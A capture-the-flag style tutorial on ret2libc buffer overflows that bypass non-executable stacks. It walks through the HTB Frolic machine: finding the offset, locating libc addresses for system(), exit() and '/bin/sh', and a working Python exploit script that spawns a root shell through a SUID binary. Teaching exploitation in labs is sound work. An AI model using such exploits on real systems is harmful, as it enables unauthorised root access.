# Ret2Libc

Ret2Libc is a type of buffer overflow that would basically bypass a non-executable stack. This attack does not require any shellcode at all, but rather some specific addresses and hopping throughout the program. Ret2libc **bypasses DEP security features**.

Compared to the OSCP buffer overflow, where we simply use `jmp esp` to go to the top of the stack and then execute shellcode, this would control the EIP to jump to the library loaded whent the binary runs.

## How it Works

When we run a binary that uses functions from a library, these libraries are **loaded into the program's virtual space**. For example, the standard C library shared object located at `/lib/i386-linux-gnu/libc-*.so` is loaded for Linux, and it's the `ntdll.dll` file loaded for Windows.&#x20;

To gain RCE, we would need to find the `system()` function, which lives in the `libc` library. The EIP that we gain control of woulud then be used to _jump_ to this function by overflowing it with its return address. After moving to this function, we would need to **execute shell commands passed to this function**. For most cases, the command for RCE is `/bin/sh`.&#x20;

Basically, we would force a program to call `system("/bin/sh")` through manipulation of the EIP. Here's a visual representation of how it works:

<figure><img src="../.gitbook/assets/image (2704).png" alt=""><figcaption></figcaption></figure>

In general:

1. EIP has been overflown to have the address of `system()` in `libc`.
2. Right after, the address of `exit()` is included, which also is within `libc`. The reason we need this is because once `system()` returns, the program jumps to `exit()`, which would allow for the vulnerable program to exit and drop us in our shell.
3. Then, a pointer with the address of `/bin/sh` is present, which is the argument we are passing to the `system()` command.

So we need to find 3 things for this attack:

1. Address of `system()`
2. Address of `exit()`
3. Address of `/bin/sh`.

All of which can be found within libc. All of this is done through analyzing the `libc` file that is within a program, and some prior enumeration as to which library is being loaded needs to be done. The locating of the offset stays the same, using `pattern_create.rb` and `pattern_offset.rb` in most cases.

## Example

This is an example of a ret2libc attack from HTB Frolic, which contains this exploit as part of its privilege escalation.

Firstly, we would find a binary named `rop` that is left behind for us, and it has the SUID binary set, meaning that when we run it, we are running it as the `root` user. We can download a copy back to our machine for further testing (either using netcat or base64 to do so).

<figure><img src="../.gitbook/assets/image (1111).png" alt=""><figcaption></figcaption></figure>

### Enumeration and Offset

First, we need to use `checksec` on the binary to see what we can and cannot do:

<figure><img src="../.gitbook/assets/image (998).png" alt=""><figcaption></figcaption></figure>

Breaking down the output, we notice that ASLR is disabled, RELRO is partial (meaning we have some space for writing code) and most importantly, NX is enabled. The stack is non executable, meaning that shellcode cannot be injected here.

Then, we can run the binary and see what it does. I used `ltrace` to enumerate what library calls and functions are being used.

<figure><img src="../.gitbook/assets/image (1028).png" alt=""><figcaption></figcaption></figure>

So first, we notice that the program takes **an unsanitised input from the user.** The 'Hello!' portion is user-supplied, and then it uses `strcpy`, which is a dangerous function vulnerable to BOF since it does not check for the length of input, and copes it to another place in memory.

So we now we know the vulnerable parameter is probably the `main()` function's `argv[1]` call. We can generate an offset using `pattern_create.rb` of length 100 first, and then run the program in `gdb` to see how it responds to our payload.

<figure><img src="../.gitbook/assets/image (3149).png" alt=""><figcaption></figcaption></figure>

Then, we can use `pattern_offset.rb` to find the offset.

<figure><img src="../.gitbook/assets/image (1103).png" alt=""><figcaption></figcaption></figure>

### Finding Addresses

Now, within the **Frolic machine**, we would need to find the libraries it has. It has to be the machine itself because we want the RCE to work there to give us a root shell. We can use `ldd` to find the **address of which the libc.so file is loaded**.

<figure><img src="../.gitbook/assets/image (2252).png" alt=""><figcaption></figcaption></figure>

So this binary loads the `libc.so.6` file in virtual memory. The base address is at `0xb7e19000`, and all other addresses we find are **offsets**, meaning we have to **add the addresses together** to find the specific address it is loaded at.

I first found the `/bin/sh` address using `strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"`

<figure><img src="../.gitbook/assets/image (2665).png" alt=""><figcaption></figcaption></figure>

The offset is `0x0015ba0b`, and when added to the base address found earlier, we would get `0xb7f74a0b`. So `/bin/sh` is there.

Then, we need to find the `system()` function. I did so using `objdump` .&#x20;

<figure><img src="../.gitbook/assets/image (1858).png" alt=""><figcaption></figcaption></figure>

Adding the offset, we would get `0xb7e53da0`. Lastly, we need `exit()` , which is found using the same manner.

<figure><img src="../.gitbook/assets/image (2651).png" alt=""><figcaption></figcaption></figure>

`0xb7e479d0` is where `exit()` lives.&#x20;

### Exploit

Now that we have found all of this, we just need to put it together. Here's my final exploit script, using python `struct` to do so. Note that there are more automated ways of exploiting this, using `pwntools` or using online websites to find the addresses directly through finding the specific Linux version the machine is using or exact `libc` file being used.

Here's the final script:

```python
#!/usr/bin/python2

import struct  
# addresses from Frolic / Kali if testing locally
system_address = struct.pack("<I", 0xb7e53da0)
exit_address = struct.pack("<I", 0xb7e479d0)
string_address = struct.pack("<I", 0xb7f74a0b)

# fill the buffer with junk:
buffer = "A" * 52

# place the arguments for the call to system() on the stack, following the order defined by the x86 calling convention:
buffer += system_address
buffer += exit_address
buffer += string_address

# finally feed the program with the malicious payload
print buffer
```

Now, we just need to feed the output from this script into `rop`. This would spawn a root shell for us and we can finish the machine.

<figure><img src="../.gitbook/assets/image (1426).png" alt=""><figcaption></figcaption></figure>
